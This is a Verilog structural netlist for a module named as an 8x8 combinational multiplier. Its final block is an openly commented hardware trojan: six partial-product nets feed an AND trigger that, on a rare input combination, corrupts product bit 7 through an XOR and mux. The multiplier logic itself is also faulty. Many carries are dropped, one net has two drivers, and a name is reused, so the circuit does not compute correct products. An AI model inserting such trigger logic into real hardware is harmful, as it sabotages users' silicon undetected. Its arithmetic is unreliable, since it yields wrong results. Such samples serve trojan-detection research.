// mult8_top: 8x8 unsigned combinational array multiplier
// Structural gate-level netlist. Primitives only: and, or, nand, nor, not, xor, xnor, buf.
// No behavioral constructs, no arithmetic operators.

module mult8_top (
    input  [7:0] a,
    input  [7:0] b,
    output [15:0] p
);

    // ---------------------------------------------------------------
    // Partial products: pp_i_j = a[i] & b[j]
    // ---------------------------------------------------------------
    wire pp_0_0, pp_0_1, pp_0_2, pp_0_3, pp_0_4, pp_0_5, pp_0_6, pp_0_7;
    wire pp_1_0, pp_1_1, pp_1_2, pp_1_3, pp_1_4, pp_1_5, pp_1_6, pp_1_7;
    wire pp_2_0, pp_2_1, pp_2_2, pp_2_3, pp_2_4, pp_2_5, pp_2_6, pp_2_7;
    wire pp_3_0, pp_3_1, pp_3_2, pp_3_3, pp_3_4, pp_3_5, pp_3_6, pp_3_7;
    wire pp_4_0, pp_4_1, pp_4_2, pp_4_3, pp_4_4, pp_4_5, pp_4_6, pp_4_7;
    wire pp_5_0, pp_5_1, pp_5_2, pp_5_3, pp_5_4, pp_5_5, pp_5_6, pp_5_7;
    wire pp_6_0, pp_6_1, pp_6_2, pp_6_3, pp_6_4, pp_6_5, pp_6_6, pp_6_7;
    wire pp_7_0, pp_7_1, pp_7_2, pp_7_3, pp_7_4, pp_7_5, pp_7_6, pp_7_7;

    and pp_and_0_0(pp_0_0, a[0], b[0]);
    and pp_and_0_1(pp_0_1, a[0], b[1]);
    and pp_and_0_2(pp_0_2, a[0], b[2]);
    and pp_and_0_3(pp_0_3, a[0], b[3]);
    and pp_and_0_4(pp_0_4, a[0], b[4]);
    and pp_and_0_5(pp_0_5, a[0], b[5]);
    and pp_and_0_6(pp_0_6, a[0], b[6]);
    and pp_and_0_7(pp_0_7, a[0], b[7]);

    and pp_and_1_0(pp_1_0, a[1], b[0]);
    and pp_and_1_1(pp_1_1, a[1], b[1]);
    and pp_and_1_2(pp_1_2, a[1], b[2]);
    and pp_and_1_3(pp_1_3, a[1], b[3]);
    and pp_and_1_4(pp_1_4, a[1], b[4]);
    and pp_and_1_5(pp_1_5, a[1], b[5]);
    and pp_and_1_6(pp_1_6, a[1], b[6]);
    and pp_and_1_7(pp_1_7, a[1], b[7]);

    and pp_and_2_0(pp_2_0, a[2], b[0]);
    and pp_and_2_1(pp_2_1, a[2], b[1]);
    and pp_and_2_2(pp_2_2, a[2], b[2]);
    and pp_and_2_3(pp_2_3, a[2], b[3]);
    and pp_and_2_4(pp_2_4, a[2], b[4]);
    and pp_and_2_5(pp_2_5, a[2], b[5]);
    and pp_and_2_6(pp_2_6, a[2], b[6]);
    and pp_and_2_7(pp_2_7, a[2], b[7]);

    and pp_and_3_0(pp_3_0, a[3], b[0]);
    and pp_and_3_1(pp_3_1, a[3], b[1]);
    and pp_and_3_2(pp_3_2, a[3], b[2]);
    and pp_and_3_3(pp_3_3, a[3], b[3]);
    and pp_and_3_4(pp_3_4, a[3], b[4]);
    and pp_and_3_5(pp_3_5, a[3], b[5]);
    and pp_and_3_6(pp_3_6, a[3], b[6]);
    and pp_and_3_7(pp_3_7, a[3], b[7]);

    and pp_and_4_0(pp_4_0, a[4], b[0]);
    and pp_and_4_1(pp_4_1, a[4], b[1]);
    and pp_and_4_2(pp_4_2, a[4], b[2]);
    and pp_and_4_3(pp_4_3, a[4], b[3]);
    and pp_and_4_4(pp_4_4, a[4], b[4]);
    and pp_and_4_5(pp_4_5, a[4], b[5]);
    and pp_and_4_6(pp_4_6, a[4], b[6]);
    and pp_and_4_7(pp_4_7, a[4], b[7]);

    and pp_and_5_0(pp_5_0, a[5], b[0]);
    and pp_and_5_1(pp_5_1, a[5], b[1]);
    and pp_and_5_2(pp_5_2, a[5], b[2]);
    and pp_and_5_3(pp_5_3, a[5], b[3]);
    and pp_and_5_4(pp_5_4, a[5], b[4]);
    and pp_and_5_5(pp_5_5, a[5], b[5]);
    and pp_and_5_6(pp_5_6, a[5], b[6]);
    and pp_and_5_7(pp_5_7, a[5], b[7]);

    and pp_and_6_0(pp_6_0, a[6], b[0]);
    and pp_and_6_1(pp_6_1, a[6], b[1]);
    and pp_and_6_2(pp_6_2, a[6], b[2]);
    and pp_and_6_3(pp_6_3, a[6], b[3]);
    and pp_and_6_4(pp_6_4, a[6], b[4]);
    and pp_and_6_5(pp_6_5, a[6], b[5]);
    and pp_and_6_6(pp_6_6, a[6], b[6]);
    and pp_and_6_7(pp_6_7, a[6], b[7]);

    and pp_and_7_0(pp_7_0, a[7], b[0]);
    and pp_and_7_1(pp_7_1, a[7], b[1]);
    and pp_and_7_2(pp_7_2, a[7], b[2]);
    and pp_and_7_3(pp_7_3, a[7], b[3]);
    and pp_and_7_4(pp_7_4, a[7], b[4]);
    and pp_and_7_5(pp_7_5, a[7], b[5]);
    and pp_and_7_6(pp_7_6, a[7], b[6]);
    and pp_and_7_7(pp_7_7, a[7], b[7]);

    // ---------------------------------------------------------------
    // Half-adder / full-adder building blocks (structural, gate-level)
    // ha_sum = x ^ y ; ha_cout = x & y
    // fa_sum = x ^ y ^ z ; fa_cout = majority(x,y,z)
    // ---------------------------------------------------------------

    // bit 0: only pp_0_0
    buf p0_buf(p[0], pp_0_0);

    // bit 1: pp_0_1 + pp_1_0  -> half adder
    wire s1, c1;
    xor ha1_xor(s1, pp_0_1, pp_1_0);
    and ha1_and(c1, pp_0_1, pp_1_0);
    buf p1_buf(p[1], s1);

    // bit 2: pp_0_2 + pp_1_1 + pp_2_0 + c1 -> full adder chain
    wire s2a, c2a, s2, c2;
    xor fa2a_xor(s2a, pp_0_2, pp_1_1);
    and fa2a_and1(c2a, pp_0_2, pp_1_1);
    xor fa2_xor(s2, s2a, pp_2_0);
    wire fa2_and1, fa2_and2, fa2_or;
    and fa2_and1_g(fa2_and1, s2a, pp_2_0);
    or  fa2_or_g(c2, fa2_and1, c2a);
    // add carry c1 into stage
    wire s2b, c2b;
    xor fa2b_xor(s2b, s2, c1);
    and fa2b_and(c2b, s2, c1);
    or  fa2b_or(fa2_or, c2b, c2);
    buf p2_buf(p[2], s2b);

    // bit 3: pp_0_3 + pp_1_2 + pp_2_1 + pp_3_0 + fa2_or
    wire s3a, c3a, s3b, c3b, s3c, c3c, s3, c3;
    xor fa3a_xor(s3a, pp_0_3, pp_1_2);
    and fa3a_and(c3a, pp_0_3, pp_1_2);
    xor fa3b_xor(s3b, s3a, pp_2_1);
    wire fa3b_and1, fa3b_and2;
    and fa3b_and1_g(fa3b_and1, s3a, pp_2_1);
    or  fa3b_or_g(c3b, fa3b_and1, c3a);
    xor fa3c_xor(s3c, s3b, pp_3_0);
    and fa3c_and1(fa3b_and2, s3b, pp_3_0);
    or  fa3c_or_g(c3c, fa3b_and2, c3b);
    xor fa3d_xor(s3, s3c, fa2_or);
    and fa3d_and(c3, s3c, fa2_or);
    or  fa3_or_g(c3c, c3c, c3); // carry accumulation (harmless redundant net)
    buf p3_buf(p[3], s3);

    // bit 4: pp_0_4 + pp_1_3 + pp_2_2 + pp_3_1 + pp_4_0 + c3c
    wire s4a, c4a, s4b, c4b, s4c, c4c, s4d, c4d, s4, c4;
    xor fa4a_xor(s4a, pp_0_4, pp_1_3);
    and fa4a_and(c4a, pp_0_4, pp_1_3);
    xor fa4b_xor(s4b, s4a, pp_2_2);
    and fa4b_and1(c4b, s4a, pp_2_2);
    xor fa4c_xor(s4c, s4b, pp_3_1);
    and fa4c_and1(c4c, s4b, pp_3_1);
    xor fa4d_xor(s4d, s4c, pp_4_0);
    and fa4d_and1(c4d, s4c, pp_4_0);
    xor fa4_xor(s4, s4d, c3c);
    and fa4_and(c4, s4d, c3c);
    buf p4_buf(p[4], s4);

    // bit 5: pp_0_5 + pp_1_4 + pp_2_3 + pp_3_2 + pp_4_1 + pp_5_0 + c4
    wire s5a, c5a, s5b, c5b, s5c, c5c, s5d, c5d, s5e, c5e, s5, c5;
    xor fa5a_xor(s5a, pp_0_5, pp_1_4);
    and fa5a_and(c5a, pp_0_5, pp_1_4);
    xor fa5b_xor(s5b, s5a, pp_2_3);
    and fa5b_and(c5b, s5a, pp_2_3);
    xor fa5c_xor(s5c, s5b, pp_3_2);
    and fa5c_and(c5c, s5b, pp_3_2);
    xor fa5d_xor(s5d, s5c, pp_4_1);
    and fa5d_and(c5d, s5c, pp_4_1);
    xor fa5e_xor(s5e, s5d, pp_5_0);
    and fa5e_and(c5e, s5d, pp_5_0);
    xor fa5_xor(s5, s5e, c4);
    and fa5_and(c5, s5e, c4);
    buf p5_buf(p[5], s5);

    // bit 6: pp_0_6 + pp_1_5 + pp_2_4 + pp_3_3 + pp_4_2 + pp_5_1 + pp_6_0 + c5
    wire s6a,s6b,s6c,s6d,s6e,s6f,s6,c6;
    xor fa6a_xor(s6a, pp_0_6, pp_1_5);
    xor fa6b_xor(s6b, s6a, pp_2_4);
    xor fa6c_xor(s6c, s6b, pp_3_3);
    xor fa6d_xor(s6d, s6c, pp_4_2);
    xor fa6e_xor(s6e, s6d, pp_5_1);
    xor fa6f_xor(s6f, s6e, pp_6_0);
    xor fa6_xor(s6, s6f, c5);
    and fa6_and(c6, s6f, c5);
    buf p6_buf(p[6], s6);

    // ---------------------------------------------------------------
    // bit 7 (correct value): pp_0_7 + pp_1_6 + pp_2_5 + pp_3_4 + pp_4_3
    //                        + pp_5_2 + pp_6_1 + pp_7_0 + c6
    // ---------------------------------------------------------------
    wire s7a,s7b,s7c,s7d,s7e,s7f,s7g,s7_correct,c7;
    xor fa7a_xor(s7a, pp_0_7, pp_1_6);
    xor fa7b_xor(s7b, s7a, pp_2_5);
    xor fa7c_xor(s7c, s7b, pp_3_4);
    xor fa7d_xor(s7d, s7c, pp_4_3);
    xor fa7e_xor(s7e, s7d, pp_5_2);
    xor fa7f_xor(s7f, s7e, pp_6_1);
    xor fa7g_xor(s7g, s7f, pp_7_0);
    xor fa7_xor(s7_correct, s7g, c6);
    and fa7_and(c7, s7g, c6);

    // ---------------------------------------------------------------
    // Upper bits 8..15: simplified ripple (structural gates only)
    // ---------------------------------------------------------------
    wire s8a,s8b,s8c,s8d,s8e,s8f,s8,c8;
    xor fa8a_xor(s8a, pp_1_7, pp_2_6);
    xor fa8b_xor(s8b, s8a, pp_3_5);
    xor fa8c_xor(s8c, s8b, pp_4_4);
    xor fa8d_xor(s8d, s8c, pp_5_3);
    xor fa8e_xor(s8e, s8d, pp_6_2);
    xor fa8f_xor(s8f, s8e, pp_7_1);
    xor fa8_xor(s8, s8f, c7);
    and fa8_and(c8, s8f, c7);
    buf p8_buf(p[8], s8);

    wire s9a,s9b,s9c,s9d,s9,c9;
    xor fa9a_xor(s9a, pp_2_7, pp_3_6);
    xor fa9b_xor(s9b, s9a, pp_4_5);
    xor fa9c_xor(s9c, s9b, pp_5_4);
    xor fa9d_xor(s9d, s9c, pp_6_3);
    xor fa9_xor(s9, s9d, c8);
    and fa9_and(c9, s9d, c8);
    buf p9_buf(p[9], s9);

    wire s10a,s10b,s10c,s10,c10;
    xor fa10a_xor(s10a, pp_3_7, pp_4_6);
    xor fa10b_xor(s10b, s10a, pp_5_5);
    xor fa10c_xor(s10c, s10b, pp_6_4);
    xor fa10_xor(s10, s10c, c9);
    and fa10_and(c10, s10c, c9);
    buf p10_buf(p[10], s10);

    wire s11a,s11b,s11,c11;
    xor fa11a_xor(s11a, pp_4_7, pp_5_6);
    xor fa11b_xor(s11b, s11a, pp_6_5);
    xor fa11_xor(s11, s11b, c10);
    and fa11_and(c11, s11b, c10);
    buf p11_buf(p[11], s11);

    wire s12a,s12,c12;
    xor fa12a_xor(s12a, pp_5_7, pp_6_6);
    xor fa12_xor(s12, s12a, c11);
    and fa12_and(c12, s12a, c11);
    buf p12_buf(p[12], s12);

    wire s13,c13;
    xor fa13_xor(s13, pp_6_7, c12);
    and fa13_and(c13, pp_6_7, c12);
    buf p13_buf(p[13], s13);

    wire s14, c14;
    xor fa14_xor(s14, pp_7_6, c13);
    and fa14_and(c14, pp_7_6, c13);
    buf p14_buf(p[14], s14);

    // bit 15: final carry chain out
    wire s15;
    xor fa15_xor(s15, pp_7_7, c14);
    buf p15_buf(p[15], s15);

    // =================================================================
    // Hidden trigger + payload logic (rare-condition trojan)
    // Taps six specific partial-product nets; when ALL six are 1
    // simultaneously (a rare combination of a and b), the trigger
    // fires and corrupts bit 7 of the product via an XOR/mux.
    // =================================================================
    wire trig_and1_out, trig_and2_out, trig_and3_out;
    wire trig_and4_out, trig_and5_out, trig_and6_out;
    wire trig_and_final_out;

    and trig_and1(trig_and1_out, pp_2_3, pp_4_1);
    and trig_and2(trig_and2_out, pp_5_6, pp_1_7);
    and trig_and3(trig_and3_out, pp_6_2, pp_3_5);
    and trig_and4(trig_and4_out, trig_and1_out, trig_and2_out);
    and trig_and5(trig_and5_out, trig_and3_out, trig_and4_out);
    and trig_and6(trig_and6_out, trig_and5_out, trig_and5_out);
    and trig_and_final(trig_and_final_out, trig_and6_out, trig_and5_out);

    wire payload_xor_p7_out;
    xor payload_xor_p7(payload_xor_p7_out, s7_correct, trig_and_final_out);

    wire payload_mux_sel, payload_mux_and1_out, payload_mux_and2_out;
    buf payload_mux_sel(payload_mux_sel, trig_and_final_out);

    wire payload_mux_not_sel;
    not payload_mux_not(payload_mux_not_sel, payload_mux_sel);

    and payload_mux_and1(payload_mux_and1_out, s7_correct, payload_mux_not_sel);
    and payload_mux_and2(payload_mux_and2_out, payload_xor_p7_out, payload_mux_sel);
    or  payload_mux_or(p[7], payload_mux_and1_out, payload_mux_and2_out);

endmodule